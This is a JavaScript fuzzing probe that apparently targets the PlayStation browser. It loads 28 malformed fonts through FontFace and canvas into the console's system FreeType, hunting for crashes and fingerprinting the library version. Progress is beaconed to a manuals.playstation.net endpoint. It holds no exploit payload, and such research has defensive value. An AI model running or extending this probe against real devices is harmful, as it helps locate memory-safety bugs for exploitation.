// FreeType probe: feed malformed fonts to the console's font stack through FontFace.
//
// The PlayStation port compiles platform/FreeType.cmake, and FontCustomPlatformDataFreeType
// calls FT_New_Memory_Face(library, buffer.data(), buffer.size(), 0, &face) on raw bytes with
// no OpenTypeSanitizer anywhere in the tree. So each case below is a direct parse request to
// Sony's system FreeType.
//
// Two questions, in order of value:
//   1. does any case kill the WebProcess? a crash is a memory-safety bug in a system library,
//      reachable from a page, and the last beacon names the case.
//   2. which cases are accepted? compared against FreeType 2.15.0 on this Mac, which accepts
//      all but four (dirent_numtables_zero, head_unitsperem_zero, trunc_8, trunc_header),
//      the accept/reject pattern fingerprints the console's vintage.
//
// Fonts are fetched from /fonts/ rather than inlined, so the corpus can grow without
// regenerating this page. Every case is beaconed before it runs, because POST body is empty
// and ordering is by path.

(function () {
  'use strict';
  var BASE = 'https://manuals.playstation.net';
  var seq = 0;

  function fire(tag) {
    seq += 1;
    var url = BASE + '/beacon/' + ('000' + seq).slice(-4) + '-' + encodeURIComponent(tag);
    try {
      (navigator.sendBeacon && navigator.sendBeacon(url, '')) ||
        fetch(url, { method: 'POST', body: '', keepalive: true, mode: 'no-cors' }).catch(function () {});
    } catch (e) {}
    try { console.log(tag); } catch (e) {}
  }

  window.onerror = function (m) { fire('F-ONERROR-' + m); };

  // A short message, so a crash leaves the last completed case in the log.
  fire('F-BOOT ua=' + (navigator.userAgent.indexOf('PlayStation') >= 0 ? 'ps5' : 'other'));

  var canvas = document.createElement('canvas');
  canvas.width = 240; canvas.height = 64;
  var ctx = canvas.getContext('2d');
  fire('F-CANVAS-' + (ctx ? 'ok' : 'null'));

  function fetchBuf(name) {
    return fetch('/fonts/' + name, { cache: 'no-store' }).then(function (r) {
      if (!r.ok) throw new Error('http' + r.status);
      return r.arrayBuffer();
    });
  }

  // Force the glyph loader and rasteriser, which are separate parsers from the sfnt header.
  // Layout alone can leave a font unrendered on this build, so the canvas pass runs too.
  function forceGlyphs(family) {
    var probe = document.createElement('span');
    probe.style.cssText = 'position:fixed;left:-4px;top:-4px;font-size:28px;font-family:"' + family + '"';
    probe.textContent = 'AaBbGg019';
    document.body.appendChild(probe);
    var w = probe.offsetWidth;                       // layout
    try {
      ctx.clearRect(0, 0, 240, 64);
      ctx.font = '28px "' + family + '"';
      ctx.fillStyle = '#fff';
      ctx.fillText('AaBbGg019', 2, 32);              // glyph load + raster
      ctx.getImageData(0, 0, 240, 64);               // readback, also exercises the backend
    } catch (e) { fire('F-CANVAS-THREW-' + e.name); }
    probe.remove();
    return w;
  }

  var CASES = [
    'valid',
    'hdmx_numrecords_huge',
    'hdmx_sizedevice_zero',
    'hdmx_count_times_size_overflow',
    'maxp_numglyphs_huge',
    'maxp_numglyphs_zero',
    'loca_short',
    'loca_empty',
    'loca_offsets_past_glyf',
    'glyf_glyph_span_huge',
    'cmap_subtable_offset_oob',
    'cmap_format4_segcount_huge',
    'head_unitsperem_zero',
    'head_magic_bad',
    'head_locformat_bad',
    'name_count_huge',
    'post_numglyphs_huge',
    'fpgm_inflated',
    'prep_huge',
    'dirent_numtables_huge',
    'dirent_numtables_zero',
    'dirent_offset_overflow',
    'dirent_length_huge',
    'dirent_overlap',
    'trunc_8',
    'trunc_header',
    'trunc_half',
    'trunc_tail'
  ];

  function runOne(name) {
    var family = 'ftprobe_' + name;
    fire('F-RUN-' + name);
    return fetchBuf(name + '.ttf').then(function (buf) {
      var face = new FontFace(family, buf);
      return face.load().then(function (loaded) {
        document.fonts.add(loaded);
        var w = forceGlyphs(family);
        fire('F-OK-' + name + '-w' + w);
      }, function (err) {
        // A rejected font is as informative as an accepted one: it is the fingerprint.
        fire('F-REJ-' + name + '-' + ((err && err.name) || 'unknown'));
      });
    }).catch(function (e) {
      fire('F-FETCHFAIL-' + name + '-' + ((e && e.name) || 'x'));
    });
  }

  // Sequential on purpose: a crash must leave exactly one case unaccounted for.
  (function loop(i) {
    if (i >= CASES.length) {
      fire('F-DONE n=' + CASES.length);
      // second sweep, reversed, to catch state that only breaks on reuse
      var rev = CASES.slice().reverse();
      (function again(j) {
        if (j >= rev.length) { fire('F-ALL-DONE'); return; }
        runOne(rev[j]).then(function () { setTimeout(function () { again(j + 1); }, 60); });
      })(0);
      return;
    }
    runOne(CASES[i]).then(function () { setTimeout(function () { loop(i + 1); }, 60); });
  })(0);
})();
